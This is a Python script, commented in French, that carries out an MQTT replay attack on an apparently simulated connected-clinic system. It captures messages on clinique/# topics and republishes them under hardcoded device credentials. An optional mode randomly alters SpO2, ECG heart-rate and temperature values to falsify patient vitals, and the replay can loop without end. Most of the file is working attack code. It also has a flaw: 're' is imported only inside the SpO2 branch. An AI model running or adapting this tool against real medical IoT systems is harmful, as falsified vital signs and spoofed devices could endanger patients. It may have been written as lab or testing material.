#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script d'attaque par rejeu (Replay Attack) pour la Clinique Connectée v2.

Fonctionnalités :
  - Capture : écoute les topics `clinique/#` et enregistre les messages dans un fichier JSON.
  - Rejeu : lit un fichier de capture et publie les messages sur le broker MQTT.
  - Attaque : peut modifier aléatoirement certaines valeurs (SpO2, ECG, etc.) pour perturber le système.
  - Authentification MQTT : utilise les mêmes credentials que les devices de la simulation.

Usage :
  python replay_attack.py --mode capture --file capture.json
  python replay_attack.py --mode replay --file capture.json --modify --delay 0.1
  python replay_attack.py --mode replay --file capture.json --rate 10 --modify
"""

import argparse
import json
import random
import time
import threading
from pathlib import Path
import paho.mqtt.client as mqtt

# ─── Paramètres par défaut ──────────────────────────────────────────
DEFAULT_BROKER = "localhost"
DEFAULT_PORT = 1883
DEFAULT_FILE = "capture.json"
SCRIPT_DIR = Path(__file__).resolve().parent

# ─── Credentials (identiques à ceux du simulateur) ─────────────────
MQTT_CREDENTIALS = {
    "chambre":    {"username": "esp32_chambre",    "password": "clinique2026"},
    "securite":   {"username": "esp32_securite",   "password": "clinique2026"},
    "energie":    {"username": "esp32_energie",    "password": "clinique2026"},
    "controleur": {"username": "esp32_controleur", "password": "clinique2026"},
}


def resolve_data_path(path: str) -> str:
    """Résout un chemin de fichier en tenant compte du dossier du script."""
    candidate = Path(path)
    if candidate.is_absolute():
        return str(candidate)

    cwd_candidate = Path.cwd() / candidate
    if cwd_candidate.exists():
        return str(cwd_candidate)

    script_candidate = SCRIPT_DIR / candidate
    if script_candidate.exists():
        return str(script_candidate)

    return str(script_candidate)

# ─── Parser ──────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="Attaque par rejeu MQTT")
parser.add_argument("--broker", default=DEFAULT_BROKER, help="Adresse du broker MQTT")
parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Port du broker")
parser.add_argument("--mode", choices=["capture", "replay"], required=True,
                    help="Mode : capture (enregistrement) ou replay (rejeu)")
parser.add_argument("--file", default=DEFAULT_FILE, help="Fichier de capture (JSON)")
parser.add_argument("--role", default="chambre", choices=MQTT_CREDENTIALS.keys(),
                    help="Rôle utilisé pour l'authentification (replay)")
parser.add_argument("--delay", type=float, default=0.5,
                    help="Délai (secondes) entre chaque message en mode replay")
parser.add_argument("--rate", type=float, default=None,
                    help="Taux de messages par seconde (remplace --delay)")
parser.add_argument("--modify", action="store_true",
                    help="Modifie aléatoirement certaines valeurs (SpO2, ECG, etc.)")
parser.add_argument("--loop", action="store_true",
                    help="En replay, boucle indéfiniment sur les messages capturés")
args = parser.parse_args()

# ─── Connexion MQTT avec authentification ──────────────────────────
def make_client(role: str, client_id_suffix: str = "") -> mqtt.Client:
    """Crée un client MQTT authentifié pour le rôle donné."""
    creds = MQTT_CREDENTIALS[role]
    client_id = f"replay-{role}-{random.randint(1000,9999)}"
    if client_id_suffix:
        client_id += f"-{client_id_suffix}"
    c = mqtt.Client(client_id=client_id)
    c.username_pw_set(creds["username"], creds["password"])
    c.on_connect = lambda cl, ud, fl, rc: print(
        f"[MQTT] Connecté en tant que {creds['username']}" if rc == 0 else f"[MQTT] Erreur rc={rc}"
    )
    c.connect(args.broker, args.port, keepalive=60)
    c.loop_start()
    return c

# ─── Capture ─────────────────────────────────────────────────────────
class Captureur:
    def __init__(self, client: mqtt.Client):
        self.client = client
        self.messages = []

    def on_message(self, client, userdata, msg):
        print(f"[CAPTURE] {msg.topic} -> {msg.payload[:80]}...")
        self.messages.append({
            "topic": msg.topic,
            "payload": msg.payload.decode("utf-8"),
            "timestamp": time.time()
        })

    def start(self, topics="clinique/#"):
        self.client.subscribe(topics)
        self.client.on_message = self.on_message
        print(f"[CAPTURE] Écoute sur {topics} ... (Ctrl+C pour arrêter)")
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        self.client.unsubscribe(topics)
        # Sauvegarde
        output_path = resolve_data_path(args.file)
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(self.messages, f, indent=2, ensure_ascii=False)
        print(f"[CAPTURE] {len(self.messages)} messages sauvegardés dans {output_path}")

# ─── Modification du payload (Line Protocol) ──────────────────────
def modify_payload(payload: str) -> str:
    """
    Modifie aléatoirement certaines mesures dans le Line Protocol.
    Cela permet de simuler une falsification des données.
    """
    lines = payload.splitlines()
    new_lines = []
    for line in lines:
        # On ne modifie que les lignes contenant des champs numériques
        # Approche simple : on cherche les champs spo2, ecg_bpm, temperature, etc.
        # On peut remplacer la valeur par une valeur déviée.
        if "spo2=" in line:
            # Exemple : spo2=95.2 -> spo2=88.1
            import re
            def repl(match):
                val = float(match.group(1))
                # Diminution aléatoire
                val = max(70, val - random.uniform(0, 15))
                return f"spo2={val:.1f}"
            line = re.sub(r"spo2=([0-9.]+)", repl, line)
        if "ecg_bpm=" in line:
            def repl(match):
                val = float(match.group(1))
                val = max(30, val + random.uniform(-20, 50))
                return f"ecg_bpm={val:.1f}"
            line = re.sub(r"ecg_bpm=([0-9.]+)", repl, line)
        if "temperature=" in line:
            def repl(match):
                val = float(match.group(1))
                val = max(35, val + random.uniform(-1, 2))
                return f"temperature={val:.1f}"
            line = re.sub(r"temperature=([0-9.]+)", repl, line)
        # On peut ajouter d'autres modifications si souhaité
        new_lines.append(line)
    return "\n".join(new_lines)

# ─── Rejeu ───────────────────────────────────────────────────────────
def replay(client: mqtt.Client, messages: list):
    """Publie les messages enregistrés, avec éventuelles modifications."""
    if args.rate:
        delay = 1.0 / args.rate
    else:
        delay = args.delay

    print(f"[REPLAY] Démarrage du rejeu ({len(messages)} messages, délai={delay:.2f}s)")
    if args.modify:
        print("[REPLAY] MODIFICATION ACTIVE : les valeurs seront altérées aléatoirement")

    count = 0
    while True:
        for msg in messages:
            topic = msg["topic"]
            payload = msg["payload"]
            if args.modify:
                payload = modify_payload(payload)
            client.publish(topic, payload)
            count += 1
            if count % 10 == 0:
                print(f"[REPLAY] {count} messages publiés")
            time.sleep(delay)
        if not args.loop:
            break
    print(f"[REPLAY] Terminé : {count} messages publiés.")

# ─── Main ────────────────────────────────────────────────────────────
def main():
    if args.mode == "capture":
        client = make_client(args.role, "capture")
        time.sleep(1)  # laisser le temps à la connexion
        cap = Captureur(client)
        cap.start()
        client.loop_stop()
        client.disconnect()
    else:  # replay
        capture_path = resolve_data_path(args.file)
        try:
            with open(capture_path, "r", encoding="utf-8") as f:
                messages = json.load(f)
        except FileNotFoundError:
            print(f"[ERREUR] Fichier {capture_path} introuvable.")
            return
        if not messages:
            print("[ERREUR] Aucun message dans le fichier.")
            return
        client = make_client(args.role, "replay")
        time.sleep(1)
        try:
            replay(client, messages)
        except KeyboardInterrupt:
            print("\n[REPLAY] Interrompu par l'utilisateur")
        client.loop_stop()
        client.disconnect()

if __name__ == "__main__":
    main()